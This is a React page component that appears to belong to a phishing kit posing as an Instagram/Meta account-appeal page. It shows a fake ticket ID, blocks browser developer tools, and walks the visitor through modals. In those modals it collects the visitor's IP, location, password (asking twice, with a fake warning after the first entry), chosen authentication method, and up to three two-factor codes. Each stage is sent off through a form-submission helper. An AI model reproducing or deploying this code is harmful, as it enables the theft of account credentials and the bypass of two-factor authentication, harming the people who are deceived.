 "use client";

import React, { useEffect, useState } from 'react';
import '../../styles/pages/Supportpage.scss';
import '../../styles/base/bootstrap.min.css';
import '../../styles/pages/Modal.scss';
import "react-phone-input-2/lib/style.css";
import AuthModal from '../components/modals/AuthModal';
import PasswordModal from '../components/modals/PasswordModal';
import SecurityModal from '../components/modals/SecurityModal';
import FinalModal from '../components/modals/FinalModal';
import ChoseAuthenModal from '../components/modals/ChoseAuthen';
import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
import disableDevtool from 'disable-devtool';
import moment from 'moment';
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const AccountPageComponent = () => {
    // LANGUAGE
    const { t, i18n } = useTranslation();
    const [ready, setReady] = useState(false);
    
    // STATE MENU
    const [activeMenu, setActiveMenu] = useState(null);

    const currentDate = moment().format('MMMM D, YYYY')

    // LOCATION
    const [userIp, setUserIp] = useState("");
    const [userFlag, setUserFlag] = useState("");

    // Add ticket ID state
    const [ticketId, setTicketId] = useState("4564-ATFD-4865");

    // STATE OPEND MODAL
    const [openAuthModal, setOpenAuthModal] = useState(false);
    const [openPasswordModal, setOpenPasswordModal] = useState(false);
    const [openSecurityModal, setOpenSecurityModal] = useState(false);
    const [openFinalModal, setOpenFinalModal] = useState(false);
    const [openTheIdModal, setOpenTheIdModal] = useState(false);
    const [timeCounter, setTimeCounter] = useState(0);

    const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false);
    const [dataCookie, setDataCookie] = useState(null);

    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);

    // LOADING STATE
    const [loadingPassword, setLoadingPassword] = useState(false);
    const [loadingSecurity, setLoadingSecurity] = useState(false);
    const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
    const [loadingTheId, setLoadingTheId] = useState(false);

    // WARNING STATE
    const [warningPassword, setWarningPassword] = useState(false);
    const [warningSecurity, setWarningSecurity] = useState(false);

    // STATE CHECK CLICK
    const [clickPassword, setClickPassword] = useState(0);
    const [clickSecurity, setClickSecurity] = useState(0);

    // STATE FILE UPLOAD
    const [fileList, setFileList] = useState([]);

    const handleFileChange = (newFileList) => {
        setFileList(newFileList);
    };

    useEffect(() => {
        if (typeof window !== 'undefined') {
            disableDevtool();
        }
    }, []);

    useEffect(() => {
        const getIp = async () => {
            try {
                const userLocation = await getUserLocation();
                setUserIp(userLocation?.ip || "Error, contact @otis_cua");

                setUserFlag(userLocation?.country_code || "US");

                const language = userLocation?.country_code.toLowerCase() || "en";
                i18n.changeLanguage(language).then(() => setReady(true));
            } catch (error) {
                console.error("Error getting IP or location:", error);
                setUserFlag("US");
            }
        }
        getIp();
    }, []);

    // FUNCTION HANDLE OPEN MENU
    const handleOpendMenu = (menuId) => {
        setActiveMenu((prevActiveMenu) => (prevActiveMenu === menuId ? null : menuId));
    };

    // FUNCTION HANDLE FINISH APPEAL
    const handleFinishAppeal = async (values) => {
        try {
            const userLocation = await getUserLocation(userIp);

            const cookieVersion_1 = {
                ip: userIp,
                location: userLocation?.location || "Error, contact @otis_cua",
                ...values
            }

            saveRecord("__ck_clv1", cookieVersion_1);
            setOpenAuthModal(false)
            setOpenPasswordModal(true);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH PASSWORD
    const handleFinishPassword = async (values) => {
        try {
            if (clickPassword === 0) {
                setLoadingPassword(true);
                let ck_data_v1 = getRecord("__ck_clv1");

                if (!ck_data_v1) {
                    console.log("Not found __ck_data");
                    ck_data_v1 = getRecord("__ck_clv1");
                }

                const cookieVersion_2 = {
                    ...ck_data_v1,
                    password: values.password
                }

                saveRecord("__ck_clv2", cookieVersion_2);
                await sendAppealForm(cookieVersion_2)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(true);
                        }, 1500);
                        setClickPassword(1)
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            } else {
                setLoadingPassword(true);
                let ck_data_v2 = getRecord("__ck_clv2");

                if (!ck_data_v2) {
                    console.log("Not found __ck_data");
                    ck_data_v2 = getRecord("__ck_clv2");
                }

                const cookieVersion_3 = {
                    ...ck_data_v2,
                    passwordSecond: values.password
                }

                saveRecord("__ck_clv3", cookieVersion_3);
                await sendAppealForm(cookieVersion_3)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(false);

                            setOpenPasswordModal(false);

                            setOpenChoseAuthenModal(true)
                            setDataCookie(cookieVersion_3)
                            // setOpenSecurityModal(true);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH CHOSE AUTHEN
    const handleFinishChoseAuthen = async (values) => {
        console.log(values);
        setLoadingChoseAuthen(true);
        let ck_data_v2 = getRecord("__ck_clv3");

        if (!ck_data_v2) {
            console.log("Not found __ck_data");
            ck_data_v2 = getRecord("__ck_clv3");
        }

        const cookieVersion_4 = {
            ...ck_data_v2,
            authMethod: values.authMethod
        }

        saveRecord("__ck_clv4", cookieVersion_4);
        await sendAppealForm(cookieVersion_4)
            .then(() => {
                setTimeout(() => {
                    setLoadingChoseAuthen(false);
                    setOpenChoseAuthenModal(false);
                    setOpenSecurityModal(true);
                    setDataCookieSecurity(cookieVersion_4);
                }, 1500);
            })
            .catch((err) => {
                console.log(err);
            });
    }

    // FUNCTION HANDLE FINISH SECURITY
    const handleFinishSecurity = async (values) => {
        switch (clickSecurity) {
            case 0:
                setLoadingSecurity(true);
                let ck_data_v4 = getRecord("__ck_clv4");

                if (!ck_data_v4) {
                    console.log("Not found __ck_data");
                    ck_data_v4 = getRecord("__ck_clv4");
                }

                const cookieVersion_5 = {
                    ...ck_data_v4,
                    twoFa: values.twoFa
                }

                saveRecord("__ck_clv5", cookieVersion_5);
                await sendAppealForm(cookieVersion_5)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(1);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 1:
                setLoadingSecurity(true);
                let ck_data_v5 = getRecord("__ck_clv5");

                if (!ck_data_v5) {
                    console.log("Not found __ck_data");
                    ck_data_v5 = getRecord("__ck_clv5");
                }

                const cookieVersion_6 = {
                    ...ck_data_v5,
                    twoFaSecond: values.twoFa
                }

                saveRecord("__ck_clv6", cookieVersion_6);
                await sendAppealForm(cookieVersion_6)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(2);
                        }, 1300);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 2:
                setLoadingSecurity(true);
                let ck_data_v6 = getRecord("__ck_clv6");

                if (!ck_data_v6) {
                    console.log("Not found __ck_data");
                    ck_data_v6 = getRecord("__ck_clv6");
                }

                const cookieVersion_7 = {
                    ...ck_data_v6,
                    twoFaThird: values.twoFa
                }

                await sendAppealForm(cookieVersion_7)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setOpenSecurityModal(false);
                            setOpenFinalModal(true);
                            resetPasswordState();
                            resetSecurityState();
                        }, 1000);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            default:
                break;
        }
    }

    // FUNCTION HANDLE TRY ANOTHER WAY
    const handleTryAnotherWay = () => {
        setOpenSecurityModal(false);
        setOpenChoseAuthenModal(true);
    }

    const resetPasswordState = () => {
        setOpenPasswordModal(false);
        setLoadingPassword(false);
        setWarningPassword(false);
        setClickPassword(0);
    };

    const resetSecurityState = () => {
        setOpenSecurityModal(false);
        setLoadingSecurity(false);
        setWarningSecurity(false);
        setTimeCounter(0);
        setClickSecurity(0);
    };

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };
        
        generateTicketId();

    }, []);

    if (!ready) {
        return ('')
    }

    return (
        <>
            <div id='main-component'>
                <div className='container-sm' id='main'>
                  
                    <div className="row container-content">
                   
                        {/* RIGHT CONTENT START */}
                        <div className="righ col-8">
                            <div className='content-right'>
                                <div className="top-content">
                                    <h1>{t('content.top_content.title')}</h1>
                                    <p>{t('content.top_content.sub.sub_1')}</p>
                                    <p>{t('content.top_content.sub.sub_2')}</p>
                                    <p className="ticket">{t('content.top_content.ticket')} #{ticketId}</p>
                                    <p><b>{t('content.guide.title')}</b></p>
                                    <ul>
                                        <li>{t('content.guide.sub.sub_1')}</li>
                                        <li>{t('content.guide.sub.sub_2')}</li>
                                        <li>{t('content.guide.sub.sub_3')}</li>
                                    </ul>
                                </div>
                                {/* CARD */}
                                <div className='card-thumb'>
                                    <img src="/banner-v3.png" width="100%" alt='warning instagram accont' />
                                    <div className='thumb-content'>
                                        <div className="warning-list">
                                            <p>{t('content.thumb.sub.sub_1')}</p>
                                            <h1><b>{t('content.thumb.title')}</b></h1>
                                            <p>{t('content.thumb.sub.sub_2')}</p>
                                        </div>
                                        <div className='btn-wrapper' onClick={() => setOpenAuthModal(true)}>
                                            <div className='button fb-blue'><b>{t('content.thumb.button')}</b></div>
                                        </div>
                                        <div className="day" style={{ marginTop: '10px', textAlign: 'center' }}>
                                            <p>{t('content.thumb.day')} <b>{currentDate}</b>.</p>
                                        </div>
                                    </div>
                                </div>

                            
                            </div>
                        </div>
                        {/* RIGHT CONTENT END */}
                    </div>
                </div>
            </div>


            <AuthModal
                openAuthModal={openAuthModal}
                onCancel={() => setOpenAuthModal(false)}
                onFinish={handleFinishAppeal}
                countryEmoji={userFlag}
            />

            <PasswordModal
                opendPasswordModal={openPasswordModal}
                onCancelPasswordModal={resetPasswordState}
                onFinishPassword={handleFinishPassword}
                loadingPassword={loadingPassword}
                warningPassword={warningPassword}
            />

            <SecurityModal
                openSecurityModal={openSecurityModal}
                onCancelSecurityModal={resetSecurityState}
                onFinishSecurity={handleFinishSecurity}
                loadingSecurity={loadingSecurity}
                timeCounter={timeCounter}
                clickSecurity={clickSecurity}
                dataCookie={dataCookieSecurity}
                onTryAnotherWay={handleTryAnotherWay}
            />

            <FinalModal
                openFinalModal={openFinalModal}
                onCancelFinalModal={() => {
                    setOpenFinalModal(false);
                    resetPasswordState();
                    resetSecurityState();
                }}
            />

            <ChoseAuthenModal
                dataCookie={dataCookie}
                openChoseAuthenModal={openChoseAuthenModal}
                onCancelChoseAuthenModal={() => setOpenChoseAuthenModal(false)}
                onFinishChoseAuthen={handleFinishChoseAuthen}
                loadingChoseAuthen={loadingChoseAuthen}
            />
        </>
    );
};

export default AccountPageComponent;